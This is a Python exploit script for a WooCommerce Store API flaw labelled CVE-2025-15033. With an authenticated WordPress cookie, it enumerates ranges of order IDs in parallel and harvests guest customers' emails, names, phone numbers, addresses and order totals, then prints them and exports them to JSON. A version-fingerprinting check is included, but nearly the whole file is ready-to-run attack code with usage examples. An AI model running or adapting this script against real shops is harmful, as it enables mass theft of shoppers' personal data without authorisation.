#!/usr/bin/env python3
"""
CVE-2025-15033 - WooCommerce Guest Order Data Disclosure Exploit
================================================================

A vulnerability in WooCommerce 8.1 to 10.4.2 allows authenticated users
to access order data of guest customers via the Store API.

Author: OctoSEC
Date: December 2025
CVE: CVE-2025-15033
CVSS: 6.5 (Medium)

Usage:
    python exploit.py -u https://target.com -c "wordpress_logged_in_xxx=value" -r 1-500
    python exploit.py -u https://target.com --check-version
"""

import argparse
import requests
import json
import sys
import re
import time
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Version vulnerability mapping
VULNERABLE_VERSIONS = {
    '10.4': 3,  # Fixed in 10.4.3
    '10.3': 7,  # Fixed in 10.3.7
    '10.2': 3,  # Fixed in 10.2.3
    '10.1': 3,  # Fixed in 10.1.3
    '10.0': 5,  # Fixed in 10.0.5
    '9.9': 6,   # Fixed in 9.9.6
    '9.8': 6,   # Fixed in 9.8.6
    '9.7': 2,   # Fixed in 9.7.2
    '9.6': 3,   # Fixed in 9.6.3
    '9.5': 3,   # Fixed in 9.5.3
}

BANNER = """
+===================================================================+
|     CVE-2025-15033 - WooCommerce Guest Order Disclosure           |
|                                                                   |
|     Affected: WooCommerce 8.1 - 10.4.2                            |
|     CVSS: 6.5 (Medium)                                            |
+===================================================================+
"""


class WooCommerceExploit:
    def __init__(self, target_url, cookie=None, threads=10, timeout=10, verbose=True):
        self.target_url = target_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        })
        
        if cookie:
            self.session.headers['Cookie'] = cookie
        
        self.results = {
            'target': self.target_url,
            'scan_time': None,
            'woocommerce_version': None,
            'vulnerable': None,
            'store_api_enabled': None,
            'exposed_orders': [],
            'stats': {
                'total_scanned': 0,
                'guest_orders_exposed': 0,
                'registered_orders': 0,
                'not_found': 0,
                'errors': 0
            }
        }

    def log(self, message, level='info'):
        """Print log message with color coding"""
        if not self.verbose and level == 'debug':
            return
            
        colors = {
            'info': '\033[94m[*]\033[0m',
            'success': '\033[92m[+]\033[0m',
            'warning': '\033[93m[!]\033[0m',
            'error': '\033[91m[-]\033[0m',
            'critical': '\033[91m[CRITICAL]\033[0m',
            'debug': '\033[90m[D]\033[0m'
        }
        prefix = colors.get(level, '[*]')
        print(f"{prefix} {message}")

    def check_version(self):
        """Detect WooCommerce version and check if vulnerable"""
        self.log("Detecting WooCommerce version...")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            html = response.text
            
            versions = set()
            
            # Pattern 1: Plugin version in CSS/JS URLs
            wc_versions = re.findall(r'plugins/woocommerce[^"\']*ver=([0-9.]+)', html)
            versions.update(wc_versions)
            
            # Pattern 2: Generator meta tag
            gen_match = re.search(r'<meta name=["\']generator["\'] content=["\']WooCommerce ([0-9.]+)', html)
            if gen_match:
                versions.add(gen_match.group(1))
            
            if versions:
                version = max(versions, key=lambda v: [int(x) for x in v.split('.')])
                self.results['woocommerce_version'] = version
                self.log(f"WooCommerce version detected: {version}", 'success')
                
                # Check if vulnerable
                parts = version.split('.')
                major_minor = f"{parts[0]}.{parts[1]}" if len(parts) >= 2 else parts[0]
                patch = int(parts[2]) if len(parts) > 2 else 0
                
                if major_minor in VULNERABLE_VERSIONS:
                    required_patch = VULNERABLE_VERSIONS[major_minor]
                    if patch < required_patch:
                        self.results['vulnerable'] = True
                        self.log(f"Version {version} is VULNERABLE! (needs >= {major_minor}.{required_patch})", 'critical')
                    else:
                        self.results['vulnerable'] = False
                        self.log(f"Version {version} appears to be PATCHED", 'success')
                elif version.startswith('8.') or version.startswith('9.'):
                    self.log(f"Version {version} may be vulnerable - manual verification needed", 'warning')
                    self.results['vulnerable'] = 'unknown'
                else:
                    self.log(f"Version {version} - unable to determine vulnerability status", 'warning')
                    self.results['vulnerable'] = 'unknown'
            else:
                self.log("Could not detect WooCommerce version from HTML", 'warning')
                
        except Exception as e:
            self.log(f"Error checking version: {e}", 'error')

    def check_store_api(self):
        """Check if Store API is enabled and accessible"""
        self.log("Checking Store API availability...")
        
        endpoints = [
            '/wp-json/wc/store/v1/',
            '/wp-json/wc/store/v1/cart',
        ]
        
        for endpoint in endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code == 200:
                    self.results['store_api_enabled'] = True
                    self.log(f"Store API is ENABLED ({endpoint} -> HTTP 200)", 'success')
                    return True
                elif response.status_code == 404:
                    continue
                else:
                    self.log(f"Store API returned HTTP {response.status_code}", 'warning')
                    
            except Exception as e:
                self.log(f"Error checking {endpoint}: {e}", 'debug')
        
        self.results['store_api_enabled'] = False
        self.log("Store API is DISABLED or not accessible (HTTP 404)", 'error')
        self.log("The vulnerable endpoint does not exist on this target", 'error')
        return False

    def fetch_order(self, order_id):
        """Attempt to fetch a single order"""
        url = f"{self.target_url}/wp-json/wc/store/v1/order/{order_id}"
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            data = response.json()
            
            self.results['stats']['total_scanned'] += 1
            
            if response.status_code == 200 and 'billing_address' in data:
                # VULNERABLE - Guest order exposed
                self.results['stats']['guest_orders_exposed'] += 1
                
                order_data = {
                    'order_id': order_id,
                    'status': data.get('status', 'unknown'),
                    'billing': {
                        'email': data.get('billing_address', {}).get('email'),
                        'first_name': data.get('billing_address', {}).get('first_name'),
                        'last_name': data.get('billing_address', {}).get('last_name'),
                        'phone': data.get('billing_address', {}).get('phone'),
                        'address_1': data.get('billing_address', {}).get('address_1'),
                        'city': data.get('billing_address', {}).get('city'),
                        'state': data.get('billing_address', {}).get('state'),
                        'postcode': data.get('billing_address', {}).get('postcode'),
                        'country': data.get('billing_address', {}).get('country'),
                    },
                    'shipping': data.get('shipping_address', {}),
                    'totals': data.get('totals', {}),
                    'items_count': len(data.get('items', []))
                }
                
                self.results['exposed_orders'].append(order_data)
                return ('EXPOSED', order_id, order_data)
                
            elif response.status_code == 403:
                # Protected - registered customer order
                self.results['stats']['registered_orders'] += 1
                return ('PROTECTED', order_id, data.get('code'))
                
            elif response.status_code == 401:
                # Patched version - requires validation
                code = data.get('code', '')
                if 'billing_email' in code or 'order_key' in code:
                    return ('PATCHED', order_id, code)
                self.results['stats']['errors'] += 1
                return ('AUTH_ERROR', order_id, code)
                
            elif response.status_code == 404:
                self.results['stats']['not_found'] += 1
                return ('NOT_FOUND', order_id, None)
                
            else:
                self.results['stats']['errors'] += 1
                return ('ERROR', order_id, response.status_code)
                
        except Exception as e:
            self.results['stats']['errors'] += 1
            return ('ERROR', order_id, str(e))

    def scan_orders(self, start_id, end_id):
        """Scan a range of order IDs for exposed guest orders"""
        self.log(f"Scanning orders {start_id} to {end_id}...")
        self.log(f"Using {self.threads} threads")
        print("-" * 60)
        
        self.results['scan_time'] = datetime.now().isoformat()
        order_ids = range(start_id, end_id + 1)
        patched_detected = False
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.fetch_order, oid): oid for oid in order_ids}
            
            for future in as_completed(futures):
                status, order_id, data = future.result()
                
                if status == 'EXPOSED':
                    email = data.get('billing', {}).get('email', 'N/A')
                    name = f"{data.get('billing', {}).get('first_name', '')} {data.get('billing', {}).get('last_name', '')}".strip()
                    self.log(f"Order #{order_id} | {email} | {name}", 'critical')
                    
                elif status == 'PATCHED' and not patched_detected:
                    patched_detected = True
                    self.log(f"PATCHED version detected - {data}", 'success')
                    self.log("Target appears to be patched. Continuing scan...", 'info')
        
        self.print_summary()

    def print_summary(self):
        """Print scan summary"""
        stats = self.results['stats']
        exposed = self.results['exposed_orders']
        
        print("\n" + "=" * 60)
        print("SCAN COMPLETE")
        print("=" * 60)
        print(f"Target:               {self.target_url}")
        print(f"WooCommerce Version:  {self.results['woocommerce_version'] or 'Unknown'}")
        print(f"Store API Enabled:    {self.results['store_api_enabled']}")
        print("-" * 60)
        print(f"Total Scanned:        {stats['total_scanned']}")
        print(f"\033[91mGuest Orders Exposed: {stats['guest_orders_exposed']}\033[0m")
        print(f"Registered Orders:    {stats['registered_orders']}")
        print(f"Not Found:            {stats['not_found']}")
        print(f"Errors:               {stats['errors']}")
        print("=" * 60)
        
        if exposed:
            print(f"\n\033[91m[!] VULNERABILITY CONFIRMED!\033[0m")
            print(f"[!] {len(exposed)} guest order(s) were accessible.\n")
            
            print("Exposed Orders:")
            print("-" * 60)
            for order in exposed[:10]:  # Show first 10
                print(f"  Order #{order['order_id']}")
                print(f"    Email: {order['billing'].get('email', 'N/A')}")
                print(f"    Name:  {order['billing'].get('first_name', '')} {order['billing'].get('last_name', '')}")
                print(f"    Phone: {order['billing'].get('phone', 'N/A')}")
                print(f"    City:  {order['billing'].get('city', 'N/A')}, {order['billing'].get('country', 'N/A')}")
                print()
            
            if len(exposed) > 10:
                print(f"  ... and {len(exposed) - 10} more orders")
        else:
            print("\n[*] No guest orders found in the scanned range.")
            print("[*] Possible reasons:")
            print("    - Site is patched")
            print("    - No guest orders exist in this range")
            print("    - Guest checkout is disabled")
            print("    - Authentication cookie is invalid/expired")

    def export_results(self, filename):
        """Export results to JSON file"""
        # Clean up results for export
        export_data = {
            'scan_info': {
                'target': self.results['target'],
                'scan_time': self.results['scan_time'],
                'woocommerce_version': self.results['woocommerce_version'],
                'vulnerable': self.results['vulnerable'],
                'store_api_enabled': self.results['store_api_enabled'],
            },
            'statistics': self.results['stats'],
            'exposed_orders': self.results['exposed_orders']
        }
        
        with open(filename, 'w') as f:
            json.dump(export_data, f, indent=2)
        
        self.log(f"Results exported to: {filename}", 'success')


def parse_range(range_str):
    """Parse range string like '1-500' into start and end"""
    if '-' in range_str:
        parts = range_str.split('-')
        return int(parts[0]), int(parts[1])
    return 1, int(range_str)


def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description='CVE-2025-15033 - WooCommerce Guest Order Data Disclosure Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u https://shop.example.com --check-version
  %(prog)s -u https://shop.example.com -c "wordpress_logged_in_xxx=value" -r 1-500
  %(prog)s -u https://shop.example.com -c "cookie" -r 1-1000 -t 20 -o results.json
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target WooCommerce site URL')
    parser.add_argument('-c', '--cookie', help='WordPress authentication cookie (wordpress_logged_in_xxx=value)')
    parser.add_argument('-r', '--range', default='1-100', help='Order ID range to scan (default: 1-100)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-o', '--output', help='Output file for results (JSON)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--check-version', action='store_true', help='Only check WooCommerce version')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode - minimal output')
    
    args = parser.parse_args()
    
    # Initialize exploit
    exploit = WooCommerceExploit(
        target_url=args.url,
        cookie=args.cookie,
        threads=args.threads,
        timeout=args.timeout,
        verbose=not args.quiet
    )
    
    # Check version
    exploit.check_version()
    
    if args.check_version:
        sys.exit(0)
    
    # Check if Store API is enabled
    if not exploit.check_store_api():
        exploit.log("Cannot proceed - Store API is not available", 'error')
        sys.exit(1)
    
    # Check for authentication
    if not args.cookie:
        exploit.log("WARNING: No authentication cookie provided!", 'warning')
        exploit.log("The exploit requires authentication. Use -c to provide cookie.", 'warning')
        exploit.log("Example: -c \"wordpress_logged_in_xxx=your_cookie_value\"", 'info')
        
        proceed = input("\nContinue anyway? (y/N): ")
        if proceed.lower() != 'y':
            sys.exit(0)
    
    # Parse range and scan
    start_id, end_id = parse_range(args.range)
    exploit.scan_orders(start_id, end_id)
    
    # Export results if requested
    if args.output:
        exploit.export_results(args.output)
    
    # Exit with appropriate code
    if exploit.results['stats']['guest_orders_exposed'] > 0:
        sys.exit(0)  # Vulnerable
    else:
        sys.exit(1)  # Not vulnerable or no results


if __name__ == '__main__':
    main()

